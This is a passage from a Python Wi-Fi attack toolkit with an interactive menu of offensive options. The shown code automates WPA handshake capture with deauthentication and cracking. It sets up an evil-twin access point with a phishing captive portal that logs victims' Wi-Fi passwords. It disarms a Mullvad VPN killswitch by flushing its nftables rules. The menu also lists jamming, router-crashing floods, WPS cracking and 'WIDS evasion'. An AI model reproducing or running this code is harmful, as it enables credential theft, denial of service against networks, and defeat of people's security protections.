    deauth(bssid, count=15, channel=channel)
    time.sleep(5)
    os.system(f"pkill -f 'airodump-ng.*{bssid}' 2>/dev/null")
    cap_thread.join(timeout=5)
    cap_file = f"{prefix}-01.cap"
    if os.path.exists(cap_file):
        r = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)
        if "WPA (1 handshake)" in r.stdout or "1 handshake" in r.stdout:
            ok(f"Handshake captured: {cap_file}")
            if wordlist:
                print(f"\n  {C['Y']}[3/3] Cracking with {wordlist}...{C['N']}")
                run(f"aircrack-ng {cap_file} -w {wordlist}", live=True)
            else:
                print(f"\n  Crack with: aircrack-ng {cap_file} -w /path/to/wordlist")
        else:
            warn("No handshake found. The AP may have PMF enabled.")
            print(f"  Try PMKID: sudo python3 {sys.argv[0]} --pmkid-loop")
    else:
        err("Capture file not found. Try manually.")

def auto_report():
    header("CAPTURES REPORT")
    if not OUT_DIR.exists():
        err(f"No captures directory: {OUT_DIR}")
        return
    files = sorted(OUT_DIR.iterdir(), key=os.path.getmtime, reverse=True)
    caps = [f for f in files if f.suffix in ('.cap', '.pcapng', '.hc22000')]
    csvs = [f for f in files if f.suffix == '.csv']
    others = [f for f in files if f not in caps and f not in csvs]
    print(f"\n  {C['BOLD']}Handshake Captures ({len(caps)}){C['N']}")
    for cf in caps[:20]:
        size = cf.stat().st_size
        hs = ""
        if cf.suffix == '.cap':
            try:
                r = subprocess.run(["aircrack-ng", str(cf)], capture_output=True, text=True, timeout=5)
                if "1 handshake" in r.stdout:
                    hs = f"{C['G']}✓ handshake{C['N']}"
                elif "0 handshake" in r.stdout:
                    hs = f"{C['R']}no handshake{C['N']}"
            except Exception:
                pass
        print(f"    {cf.name} ({size//1024}KB) {hs}")
    print(f"\n  {C['BOLD']}Scan CSVs ({len(csvs)}){C['N']}")
    for sf in csvs[:10]:
        size = sf.stat().st_size
        print(f"    {sf.name} ({size//1024}KB)")
    print(f"\n  {C['BOLD']}Other ({len(others)}){C['N']}")
    for of in others[:10]:
        print(f"    {of.name}")

def captive_portal(target_ssid, channel=6):
    require("hostapd", "dnsmasq")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"CAPTIVE PORTAL — '{target_ssid}' ch{channel}")
    print(f"  {C['Y']}Client sees a 'login' page, credentials logged to terminal{C['N']}")
    portal_script = f'''#!/usr/bin/env python3
import http.server, socketserver, urllib.parse, sys
PORT = 80
LOG_FILE = "{OUT_DIR}/creds_{target_ssid.replace(" ", "_")}.txt"
HTML = """<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{{font-family:Arial;display:flex;justify-content:center;
align-items:center;height:100vh;margin:0;background:#1a1a2e;color:#eee}}
.box{{background:#16213e;padding:40px;border-radius:10px;text-align:center}}
input{{display:block;width:100%;margin:10px 0;padding:12px;border:1px solid #0f3460;
border-radius:5px;background:#0f3460;color:#eee;font-size:16px}}
button{{background:#e94560;color:white;border:none;padding:12px 30px;border-radius:5px;
font-size:16px;cursor:pointer;width:100%}}h3{{margin-bottom:20px}}</style></head>
<body><div class="box"><h3>WiFi Authentication Required</h3>
<p>Please re-enter your password to continue</p>
<form method="POST">
<input type="password" name="password" placeholder="WiFi Password" autofocus>
<button type="submit">Connect</button></form></div></body></html>
"""
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-type","text/html"); self.end_headers()
        self.wfile.write(HTML.encode())
    def do_POST(self):
        cl = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(cl).decode()
        pw = urllib.parse.parse_qs(data).get('password', [''])[0]
        ip = self.client_address[0]
        print(f"\\\\n[!] CAPTURED: {{ip}} -> password='{{pw}}'")
        with open(LOG_FILE, "a") as f: f.write(f"{{ip}}|{{pw}}\\n")
        self.send_response(302); self.send_header("Location", "/?success=1"); self.end_headers()
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("10.0.0.1", PORT), H) as httpd:
    print(f"[+] Captive portal on 10.0.0.1:{PORT} — log to {{LOG_FILE}}")
    httpd.serve_forever()
'''
    portal_path = f"/tmp/alfa_portal_{int(time.time())}.py"
    with open(portal_path, "w") as f:
        f.write(portal_script)
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={target_ssid}
channel={channel}
hw_mode={'a' if channel > 14 else 'g'}
macaddr_acl=0
auth_algs=1
wpa=0
"""
    with open(HOSTAPD_CONF, "w") as f:
        f.write(hostapd_conf)
    dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
port=5353
"""
    with open(DNSMASQ_CONF, "w") as f:
        f.write(dnsmasq_conf)
    ok("Starting evil twin + DHCP + captive portal...")
    run(f"ip addr add 10.0.0.1/24 dev {iface}", check=False)
    run(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80", check=False)
    import threading
    def start_dnsmasq():
        subprocess.run(f"dnsmasq -C {DNSMASQ_CONF} --no-daemon",
                       shell=True, preexec_fn=os.setsid,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    def start_portal():
        subprocess.run(f"python3 {portal_path}", shell=True, preexec_fn=os.setsid)
    def start_ap():
        subprocess.run(f"hostapd {HOSTAPD_CONF}", shell=True, preexec_fn=os.setsid)
    threads = []
    for fn in [start_dnsmasq, start_portal, start_ap]:
        t = threading.Thread(target=fn, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.5)
    print(f"\n  {C['G']}[READY] Captive portal active!{C['N']}")
    print(f"  Target AP: {target_ssid}")
    print(f"  Credentials logged to: {OUT_DIR}/creds_{target_ssid.replace(' ', '_')}.txt")
    print(f"  {C['Y']}(Ctrl+C to stop){C['N']}")
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Stopping...{C['N']}")
        os.system("pkill -f 'dnsmasq.*alfa' 2>/dev/null")
        os.system(f"pkill -f 'hostapd.*{HOSTAPD_CONF}' 2>/dev/null")
        os.system(f"pkill -f '{portal_path}' 2>/dev/null")
        run(f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80", check=False)
        run(f"ip addr del 10.0.0.1/24 dev {iface}", check=False)

# ═══════════════════════════════════════════════════════════════
# VPN BYPASS
# ═══════════════════════════════════════════════════════════════

VPN_DETECTED = None
VPN_BYPASS_ACTIVE = False
VPN_WLAN1_IP = None

def _get_wlan1_ip():
    try:
        r = subprocess.run(["ip", "-4", "addr", "show", IFACE], capture_output=True, text=True)
        m = re.search(r'inet\s+([\d.]+)', r.stdout)
        return m.group(1) if m else None
    except Exception:
        return None

def detect_vpn():
    global VPN_DETECTED
    try:
        r = subprocess.run(["sudo", "nft", "list", "table", "inet", "mullvad"],
                           capture_output=True, text=True, timeout=5)
        if "table inet mullvad" in r.stdout and ("chain output" in r.stdout or "chain input" in r.stdout):
            VPN_DETECTED = "mullvad"
            return "mullvad"
    except Exception:
        pass
    try:
        r = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
        for line in r.stdout.split("\n"):
            if "wg0-mullvad" in line:
                VPN_DETECTED = "mullvad"
                return "mullvad"
    except Exception:
        pass
    try:
        r = subprocess.run("pgrep -f protonvpn", shell=True, capture_output=True, text=True)
        if r.stdout.strip():
            VPN_DETECTED = "proton"
            return "proton"
    except Exception:
        pass
    VPN_DETECTED = None
    return None

def vpn_bypass_enable():
    global VPN_BYPASS_ACTIVE, VPN_WLAN1_IP
    vpn_type = detect_vpn()
    if not vpn_type:
        warn("No VPN killswitch detected — wlan1 should already have internet")
        VPN_BYPASS_ACTIVE = True
        return True
    wlan1_ip = _get_wlan1_ip()
    if not wlan1_ip:
        err(f"No IP on {IFACE} — connect to WiFi first")
        return False
    VPN_WLAN1_IP = wlan1_ip
    header(f"VPN BYPASS — {vpn_type.upper()} -> {IFACE} ({wlan1_ip})")
    if vpn_type == "mullvad":
        run("systemctl stop mullvad-daemon 2>/dev/null", live=False)
        time.sleep(1)
        for chain in ["output", "input", "forward"]:
            run(f"nft flush chain inet mullvad {chain}", live=False)
            run(f"nft chain inet mullvad {chain} '{{ policy accept; }}'", live=False)
        ok("[1/4] nftables: Mullvad daemon STOPPED + all chains disarmed")
        subprocess.run(f"sudo ip rule del from {wlan1_ip} table main 2>/dev/null", shell=True)
        run(f"ip rule add from {wlan1_ip} table main priority 1", live=False)
        ok(f"[2/4] Policy routing: {wlan1_ip} bypasses VPN table")
        try:
            gw = wlan1_ip.rsplit(".", 1)[0] + ".1"
            subprocess.run(f"sudo ip route del default via {gw} dev {IFACE} 2>/dev/null", shell=True)
            subprocess.run(f"sudo ip route del default via {gw} dev wlan0 2>/dev/null", shell=True)
            run(f"ip route add default via {gw} dev {IFACE} metric 100", live=False)
            run(f"ip route add default via {gw} dev wlan0 metric 600", live=False)
            ok(f"[3/4] wlan1 set as PRIMARY route (metric 100 vs wlan0 600)")
        except Exception:
            pass
        time.sleep(1)
        r = subprocess.run(
            f"curl --interface {IFACE} --connect-timeout 3 -s -o /dev/null -w '%{{http_code}}' http://google.com",
            shell=True, capture_output=True, text=True)
        if r.stdout.strip() in ("200", "301", "302"):
            ok(f"[4/4] Internet verified via {IFACE} (HTTP {r.stdout.strip()})")
        else:
            warn(f"[4/4] Internet test: HTTP {r.stdout.strip()} — may need a moment")
    elif vpn_type in ("proton", "wireguard"):
        wlan1_ip = VPN_WLAN1_IP
        subprocess.run(f"sudo ip rule del from {wlan1_ip} table main 2>/dev/null", shell=True)
        run(f"ip rule add from {wlan1_ip} table main priority 1", live=False)
        ok(f"Policy routing: {wlan1_ip} bypasses VPN table")
    VPN_BYPASS_ACTIVE = True
    return True

def vpn_bypass_disable():
    global VPN_BYPASS_ACTIVE, VPN_WLAN1_IP
    header("VPN BYPASS — REMOVING")
    vpn_type = VPN_DETECTED or detect_vpn()
    if vpn_type == "mullvad":
        os.system("sudo systemctl start mullvad-daemon 2>/dev/null &")
        time.sleep(1)
        ok("Mullvad killswitch restored (daemon rebuilding rules)")
    wlan1_ip = VPN_WLAN1_IP or _get_wlan1_ip()
    if wlan1_ip:
        subprocess.run(f"sudo ip rule del from {wlan1_ip} table main 2>/dev/null", shell=True)
        ok(f"Policy routing rule removed for {wlan1_ip}")
        gw = wlan1_ip.rsplit(".", 1)[0] + ".1"
        subprocess.run(f"sudo ip route del default via {gw} dev {IFACE} 2>/dev/null", shell=True)
        subprocess.run(f"sudo ip route del default via {gw} dev wlan0 2>/dev/null", shell=True)
        subprocess.run(f"sudo ip route add default via {gw} dev wlan0 metric 100 2>/dev/null", shell=True)
        subprocess.run(f"sudo ip route add default via {gw} dev {IFACE} metric 600 2>/dev/null", shell=True)
        ok("wlan0 restored as primary route")
    VPN_BYPASS_ACTIVE = False
    VPN_WLAN1_IP = None
    ok("VPN protection restored for wlan1")

def vpn_status():
    vpn_type = detect_vpn()
    wlan1_ip = _get_wlan1_ip()
    print(f"\n  {C['BOLD']}VPN STATUS{C['N']}")
    if vpn_type:
        print(f"  {C['M']}VPN: {vpn_type.upper()} active{C['N']}")
        if VPN_BYPASS_ACTIVE:
            print(f"  {C['G']}Bypass: ON — {IFACE} ({wlan1_ip}) has raw internet{C['N']}")
        else:
            print(f"  {C['R']}Bypass: OFF — {IFACE} traffic blocked by VPN killswitch{C['N']}")
    else:
        print(f"  {C['DIM']}No VPN detected — all interfaces free{C['N']}")
    if wlan1_ip:
        r1 = subprocess.run(
            f"curl --interface {IFACE} --connect-timeout 2 -s -o /dev/null -w '%{{http_code}}' http://google.com",
            shell=True, capture_output=True, text=True)
        ok_icon = f"{C['G']}✓{C['N']}" if r1.stdout.strip() in ("200", "301", "302") else f"{C['R']}✗{C['N']}"
        print(f"  {IFACE} internet: {ok_icon}")

def daily_connect(ssid, password=None):
    set_managed()
    time.sleep(2)
    ok(f"Scanning for '{ssid}' on {IFACE}...")
    run(f"nmcli device wifi rescan ifname {IFACE}", live=False)
    time.sleep(4)
    pw = f"password '{password}'" if password else ""
    result = run(f"nmcli --show-secrets device wifi connect '{ssid}' {pw} ifname {IFACE}", live=True)
    time.sleep(2)
    if _get_wlan1_ip():
        vpn = detect_vpn()
        if vpn:
            print()
            warn(f"{vpn.upper()} VPN killswitch detected — auto-enabling bypass...")
            vpn_bypass_enable()
        ok(f"{IFACE} online at {_get_wlan1_ip()}")

# ═══════════════════════════════════════════════════════════════
# MENU INTERACTIF
# ═══════════════════════════════════════════════════════════════

def interactive_menu():
    _arm_killer()
    while True:
        os.system("clear" if os.name == "posix" else "cls")
        print(BANNER)
        print(f"  {C['BOLD']}[ ATK ] ATTACKS{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}1{C['N']}  Scan APs (2.4 + 5GHz)")
        print(f"   {C['R']}2{C['N']}  Scan 5GHz only")
        print(f"   {C['R']}3{C['N']}  Discover hidden SSIDs")
        print(f"   {C['R']}4{C['N']}  Sniff probe requests")
        print(f"   {C['R']}5{C['N']}  Capture WPA handshake")
        print(f"   {C['R']}6{C['N']}  PMKID capture (simple ou loop)")
        print(f"   {C['R']}7{C['N']}  Deauth client(s)")
        print(f"   {C['R']}8{C['N']}  Flood attacks (SSID choice)")
        print(f"   {C['R']}9{C['N']}  Other floods (auth, deauth all, probe)")
        print(f"   {C['R']}10{C['N']} Wi-Fi jammer")
        print()
        print(f"  {C['BOLD']}[ CRACK ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}11{C['N']} Crack .cap (aircrack-ng)")
        print(f"   {C['R']}12{C['N']} Crack PMKID (hashcat)")
        print(f"   {C['R']}13{C['N']} Crack with john")
        print(f"   {C['R']}14{C['N']} Crack with cowpatty")
        print()
        print(f"  {C['BOLD']}[ WPS ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}15{C['N']} Reaver")
        print(f"   {C['R']}16{C['N']} Bully")
        print(f"   {C['R']}17{C['N']} Pixie Dust")
        print()
        print(f"  {C['BOLD']}[ EVIL TWIN ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}18{C['N']} Airbase-ng")
        print(f"   {C['R']}19{C['N']} KARMA")
        print(f"   {C['R']}20{C['N']} Hostapd + DHCP")
        print(f"   {C['R']}21{C['N']} Enterprise WPE")
        print(f"   {C['R']}22{C['N']} Captive portal (phishing)")
        print()
        print(f"  {C['BOLD']}[ TOOLS ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}23{C['N']} Adapter status")
        print(f"   {C['R']}24{C['N']} Switch to monitor mode")
        print(f"   {C['R']}25{C['N']} Switch to managed mode")
        print(f"   {C['R']}26{C['N']} Spoof MAC")
        print(f"   {C['R']}27{C['N']} Injection test")
        print(f"   {C['R']}28{C['N']} Tool audit")
        print(f"   {C['R']}29{C['N']} Install missing tools")
        print()
        print(f"  {C['BOLD']}[ INFO ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}45{C['N']}  Show WiFi networks (nmcli)")
        print()
        print(f"  {C['BOLD']}[ PERF ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}46{C['N']}  Tune adapter (MAX PERF)")
        print(f"   {C['R']}47{C['N']}  Boost TX power")
        print(f"   {C['R']}48{C['N']}  Show perf status")
        print(f"   {C['R']}49{C['N']}  Set injection rate (pps)")
        print(f"   {C['R']}50{C['N']}  MDK4 speed tune")
        print()
        print(f"  {C['BOLD']}[ AUTO ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}30{C['N']} wifite (auto-pwn)")
        print(f"   {C['R']}31{C['N']} Auto chain (capture + deauth + crack)")
        print(f"   {C['R']}32{C['N']} Auto PMKID + crack")
        print(f"   {C['R']}33{C['N']} Captures report")
        print()
        print(f"  {C['BOLD']}[ VPN ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}34{C['N']} VPN status")
        print(f"   {C['R']}35{C['N']} VPN bypass ON")
        print(f"   {C['R']}36{C['N']} VPN bypass OFF")
        print()
        print(f"  {C['BOLD']}[ AIRSNITCH ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}37{C['N']} GTK injection")
        print(f"   {C['R']}38{C['N']} PTK injection")
        print(f"   {C['R']}39{C['N']} IP forwarding")
        print()
        print(f"  {C['BOLD']}[ CRASH BEAST ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}43{C['N']} {C['BOLD']}CRASH BEAST — DoS massif (crash routeur){C['N']}")
        print(f"   {C['R']}44{C['N']} {C['BOLD']} APOCALYPSE ENGINE — Attaque intelligente adaptative{C['N']}")
        print()
        print(f"  {C['BOLD']}[ BRAIN ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}51{C['N']}  Show brain state / learned strategies")
        print(f"   {C['R']}52{C['N']}  Autonomous campaign (auto-brain)")
        print(f"   {C['R']}53{C['N']}  WIDS check + evasion params")
        print(f"   {C['R']}54{C['N']}  Guess WPS PIN candidates")
        print(f"   {C['R']}55{C['N']}  Generate targeted wordlist")
        print(f"   {C['R']}56{C['N']}  Natural language command")
        print()
        print(f"  {C['BOLD']}[ MISC ]{C['N']}")
        print(f"  {C['DIM']}{'─'*50}{C['N']}")
        print(f"   {C['R']}40{C['N']} MITM (bettercap)")
        print(f"   {C['R']}41{C['N']} Daily WiFi connect")
        print(f"   {C['R']}42{C['N']} Cleanup")
        print(f"   {C['R']}0{C['N']}  Exit")
        print()

        choice = ask("Select", "0")

        if choice == "0":
            break

        # -------- NOUVELLE OPTION 45 : nmcli --------
        elif choice == "45":
            show_wifi_nmcli()

        # -------- PMKID (option 6) --------
        elif choice == "6":
            print("  {C['Y']}1. Capture simple (canal fixe){C['N']}")
            print("  {C['Y']}2. LOOP INFINIE (capture continue jusqu'a Ctrl+C){C['N']}")
            sub = ask("Choisis", "1")
            if sub == "2":
                ch = ask("Canal (ou Enter pour auto)", "")
                pmkid_capture_loop(int(ch) if ch else None)
            else:
                ch = ask("Canal")
                pmkid_capture(int(ch))

        # -------- CRASH BEAST (option 43) --------
        elif choice == "43":
            print("\n  {C['Y']}0. AUTO — scanne et attaque le reseau le plus fort{C['N']}")
            print("  {C['Y']}1. Auth flood (sature le routeur, meme sans clients){C['N']}")
            print("  {C['Y']}2. Deauth flood (deconnecte tous les clients){C['N']}")
            print("  {C['Y']}3. EAPOL Start flood (sature l'authentification){C['N']}")
            print("  {C['Y']}4. Beam attack (Michael Countermeasures - TKIP){C['N']}")
            print("  {C['Y']}5. ULTIMATE (Auth + Deauth + Eapol en parallele){C['N']}")
            print("  {C['Y']}6. Jammer (Deauth + Beacon flood){C['N']}")
            print("  {C['Y']}7. MULTIPLIER (lance N processus en parallele){C['N']}")
            sub = ask("Choisis le type d'attaque", "1")
            if sub == "7":
                num = ask("Nombre de processus (50, 100, 200...)", "50")
                atype = ask("Type d'attaque (auth, deauth, eapol, beam)", "auth")
                ch = ask("Canal (1,6,11)", "6")
                bssid = ask("BSSID cible (ou Enter pour toutes)", "")
                multiplier_attack(int(ch), bssid if bssid else None, atype, int(num))
            else:
                attack_map = {"0":"auth", "1":"auth", "2":"deauth", "3":"eapol", "4":"beam", "5":"ultimate", "6":"jammer"}
                atype = attack_map.get(sub, "auth")
                auto = (sub == "0")
                if auto:
                    crash_beast(6, None, atype, auto=True)
                else:
                    ch = ask("Canal (1,6,11 recommande)", "6")
                    bssid = ask("BSSID cible (ou Enter pour toutes)", "")
                    crash_beast(int(ch), bssid if bssid else None, atype, auto=False)

        # -------- APOCALYPSE ENGINE (option 44) --------
        elif choice == "44":
            bssid = ask("BSSID cible (ou Enter pour auto-detecter)", "")
            ch = ask("Canal (ou Enter pour auto)", "")
            apocalypse_mode(bssid if bssid else None, int(ch) if ch else None)

        # -------- FLOOD (option 8) --------
        elif choice == "8":
            print("\n  {C['Y']}1. Random SSIDs (mdk4 junk){C['N']}")
            print("  {C['Y']}2. Realistic SSIDs (predefinis){C['N']}")
            print("  {C['Y']}3. Realistic + VERIFY (check on wlan0){C['N']}")
            print("  {C['Y']}4. Charger un fichier texte (un SSID par ligne){C['N']}")
            print("  {C['Y']}5. Saisir des noms personnalises (separes par des virgules){C['N']}")
            print(f"  {C['Y']}6. {C['BOLD']}FLOOD BEAST (loop infinie) avec vos SSID{C['N']}")
            sub = ask("Choisis", "2")
            if sub == "1":
                n = ask("Number of SSID", "150")
                ch = ask("Channels (comma-separated)", "1,6,11")
                beacon_flood(int(n), channels=ch)
            elif sub == "2":
                n = ask("Number of SSID", "150")
                ch = ask("Channels (comma-separated)", "1,6,11")
                beacon_flood(int(n), channels=ch, realistic=True)
            elif sub == "3":
                n = ask("Number of SSID", "200")
                ch = ask("Channels (comma-separated)", "1,6,11")
                beacon_flood_verify(int(n), channels=ch)
            elif sub == "4":
                file_path = ask("Chemin du fichier contenant les SSID (un par ligne)")
                if os.path.exists(file_path):
                    ch = ask("Canal fixe (1,6,11 recommande)", "6")
                    n = ask("Nombre de SSID a utiliser (max)", "200")
                    flood_beast(int(ch), int(n), ssid_file=file_path)
                else:
                    warn("Fichier introuvable")
            elif sub == "5":
                names = ask("Entrez les noms separes par des virgules (ex: WiFi1,WiFi2,WiFi3)")
                if names.strip():
                    ssid_list = [s.strip() for s in names.split(',') if s.strip()]
                    ch = ask("Canal fixe (1,6,11 recommande)", "6")
                    n = ask("Nombre de SSID a utiliser (max)", str(len(ssid_list)))
                    flood_beast(int(ch), int(n), ssid_list=ssid_list)
                else:
                    warn("Aucun nom saisi")
            elif sub == "6":
                ch = ask("Canal fixe (1,6,11 recommande)", "6")
                n = ask("Nombre de SSID (max 300)", "200")
                use_custom = ask("Utiliser des noms personnalises ? (y/n)", "n")
                if use_custom.lower() == "y":
                    names = ask("Entrez les noms (virgules)")
                    if names.strip():
                        ssid_list = [s.strip() for s in names.split(',') if s.strip()]
                        flood_beast(int(ch), int(n), ssid_list=ssid_list)
                    else:
                        flood_beast(int(ch), int(n))
                else:
                    flood_beast(int(ch), int(n))
            else:
                warn("Invalid choice")

        # -------- Autres options (inchangées) --------
        elif choice == "1":
            t = ask("Scan time (seconds)", "15")
            scan_aps(band="abg", timeout=int(t))
        elif choice == "2":
            t = ask("Scan time (seconds)", "15")
            scan_5ghz(timeout=int(t))
        elif choice == "3":
            ch = ask("Channel (or Enter to hop all)", "")
            hidden_ssid_discover(channel=int(ch) if ch else None)
        elif choice == "4":
            t = ask("Sniff time (seconds)", "30")
            probe_sniff(timeout=int(t))
        elif choice == "5":
            bssid = ask("Target BSSID")
            ch = ask("Channel")
            capture_handshake(bssid, int(ch))
        elif choice == "7":
            bssid = ask("Target BSSID")
            client = ask("Client MAC (Enter for broadcast)")
            n = ask("Packet count", "15")
            ch = ask("Channel (optional)")
            deauth(bssid, client if client else None, int(n), int(ch) if ch else None)
        elif choice == "9":
            print("  1. Auth flood  2. Deauth all  3. Probe flood")
            sub = ask("Select", "1")
            if sub == "1":
                bssid = ask("Target BSSID (Enter for all)")
                auth_flood(bssid if bssid else None)
            elif sub == "2":
                deauth_flood_all()
            elif sub == "3":
                probe_flood()
        elif choice == "10":
            confirm = ask("FULL WiFi jammer — type YES", "")
            if confirm == "YES":
                wifi_jammer()
        elif choice == "11":
            cap = ask("Path to .cap file")
            wl = ask("Wordlist (Enter for rockyou)", str(ROCKYOU) if os.path.exists(ROCKYOU) else "")
            crack_cap(cap, wl if wl else None)
        elif choice == "12":
            hc = ask("Path to .hc22000 file")
            wl = ask("Wordlist (Enter for rockyou)", str(ROCKYOU) if os.path.exists(ROCKYOU) else "")
            crack_pmkid(hc, wl if wl else None)
        elif choice == "13":
            cap = ask("Path to .cap file")
            wl = ask("Wordlist (Enter for rockyou)", str(ROCKYOU) if os.path.exists(ROCKYOU) else "")
            crack_john(cap, wl if wl else None)
        elif choice == "14":
            cap = ask("Path to .cap file")
            ssid = ask("SSID")
            wl = ask("Wordlist (Enter for rockyou)", str(ROCKYOU) if os.path.exists(ROCKYOU) else "")
            cowpatty_crack(cap, ssid, wl if wl else None)
        elif choice == "15":
            bssid = ask("Target BSSID")
            ch = ask("Channel")
            wps_reaver(bssid, int(ch))
        elif choice == "16":
            bssid = ask("Target BSSID")
            ch = ask("Channel")
            wps_bully(bssid, int(ch))
        elif choice == "17":
            bssid = ask("Target BSSID")
            ch = ask("Channel")
            wps_pixie(bssid, int(ch))
        elif choice == "18":
            ssid = ask("AP SSID to clone")
            ch = ask("Channel")
            evil_twin_airbase(ssid, int(ch) if ch else None)
        elif choice == "19":
            ch = ask("Channel", "6")
            evil_twin_karma(int(ch))
        elif choice == "20":
            ssid = ask("AP SSID")
            ch = ask("Channel", "6")
            evil_twin_hostapd(ssid, int(ch))
        elif choice == "21":
            ssid = ask("Enterprise AP SSID")
            ch = ask("Channel", "6")
            evil_twin_wpe(ssid, int(ch))
        elif choice == "22":
            ssid = ask("AP SSID to clone")
            ch = ask("Channel", "6")
            captive_portal(ssid, int(ch))
        elif choice == "23":
            show_status()
        elif choice == "24":
            set_monitor()
        elif choice == "25":
            set_managed()
        elif choice == "26":
            spoof_mac()
        elif choice == "27":
            bssid = ask("Target BSSID (optional)")
            ch = ask("Channel (optional)")
            injection_test(bssid if bssid else None, int(ch) if ch else None)
        elif choice == "28":
            audit_tools()
        elif choice == "29":
            install_missing()
        elif choice == "30":
            auto_wifite()
        elif choice == "31":
            bssid = ask("Target BSSID")
            ch = ask("Channel")
            wl = ask("Wordlist (Enter to skip cracking)")
            auto_chain(bssid, int(ch), wl if wl else None)
        elif choice == "32":
            ch = ask("Channel")
            pmkid_capture(int(ch))
        elif choice == "33":
            auto_report()
        elif choice == "34":
            vpn_status()
        elif choice == "35":
            vpn_bypass_enable()
        elif choice == "36":
            vpn_bypass_disable()
        elif choice == "37":
            ssid = ask("Target SSID")
            psk = ask("Network password (PSK)")
            ch = ask("Channel (optional)")
            run_airsnitch_test("gtk-inject", ssid, psk, int(ch) if ch else None)
        elif choice == "38":
            ssid = ask("Target SSID")
            psk = ask("Network password (PSK)")
            ch = ask("Channel (optional)")
            run_airsnitch_test("ptk-inject", ssid, psk, int(ch) if ch else None)
        elif choice == "39":
            ssid = ask("Target SSID")
            psk = ask("Network password (PSK)")
            ch = ask("Channel (optional)")
            run_airsnitch_test("ip-forward", ssid, psk, int(ch) if ch else None)
        elif choice == "40":
            mitm_bettercap()
        elif choice == "41":
            ssid = ask("SSID")
            pw = ask("Password")
            daily_connect(ssid, pw)
        elif choice == "42":
            cleanup()
        elif choice == "46":
            tune_adapter()
        elif choice == "47":
            boost_txpower()
        elif choice == "48":
            show_perf()
        elif choice == "49":
            set_injection_rate()
        elif choice == "50":
            tune_mdk4_speed()
        elif choice == "51":
            _cmd_brain()
        elif choice == "52":
            intent = ask("Intent (crack/scan/pmkid/wps)", "crack")
            _cmd_auto_brain(intent)
        elif choice == "53":
            score = brain.detect_wids() if brain else 0.0
            params = brain.evasion_params(score) if brain else {}
            ok(f"WIDS score: {score:.2f} -> {params}")
        elif choice == "54":
            target = ask("BSSID or SSID", "")
            if target and brain:
                print("\n".join(brain.wps_pin_candidates(essid=target, bssid=target)))
        elif choice == "55":
            out = Path.home() / ".cache" / "nyvyrx_ss_lsof" / "brain" / "targeted_dict.txt"
            words = brain.targeted_dict() if brain else []
            out.write_text("\n".join(words))
            ok(f"Wrote {len(words)} words to {out}")
        elif choice == "56":
            cmd = ask("Natural language command (FR/EN)")
            if cmd and brain:
                print(brain.parse_nl(cmd))
        else:
            warn("Invalid choice")

        input(f"\n  {C['DIM']}[Enter to continue...]{C['N']}")

# ═══════════════════════════════════════════════════════════════
# SHOW STATUS
# ═══════════════════════════════════════════════════════════════

def show_status():
    header("ADAPTER STATUS")
    os.system("iw dev")
    os.system("iwconfig")

# ═══════════════════════════════════════════════════════════════
# AIRSNITCH (raccourci)
# ═══════════════════════════════════════════════════════════════

def find_airsnitch():
    global _AIRSNITCH_PATH
    if _AIRSNITCH_PATH is not None:
        return _AIRSNITCH_PATH
    env_path = os.environ.get("AIRSNITCH_DIR")
    if env_path and Path(env_path).exists():
        _AIRSNITCH_PATH = Path(env_path)
        return _AIRSNITCH_PATH
    home = Path.home()
    candidates = [
        home / "tools/airsnitch",
        home / "airsnitch",
        home / "Documents/GitHub/airsnitch",
        home / "Downloads/airsnitch",
        Path("/opt/airsnitch"),
        Path("/usr/local/airsnitch"),
        home / ".local/share/airsnitch",
    ]
    for p in candidates:
        if p.exists() and (p / "airsnitch").exists():
            _AIRSNITCH_PATH = p
            return _AIRSNITCH_PATH
    try:
        result = subprocess.run(
            "find / -type d -name 'airsnitch' 2>/dev/null | head -1",
            shell=True, capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0 and result.stdout.strip():
            found = Path(result.stdout.strip())
            if (found / "research" / "client.py").exists():
                _AIRSNITCH_PATH = found.parent
                return _AIRSNITCH_PATH
    except Exception:
        pass
    _AIRSNITCH_PATH = None
    return None

def airsnitch_available():
    base = find_airsnitch()
    if not base:
        return False
    venv = base / "venv"
    client = base / "airsnitch" / "research" / "client.py"
    if not client.exists():
        return False
    if not venv.exists():
        return False
    return True

def airsnitch_auto_setup():
    base = find_airsnitch()
    if not base:
        warn("AirSnitch not found. Please clone it to ~/tools/airsnitch or set AIRSNITCH_DIR")
        return False
    venv = base / "venv"
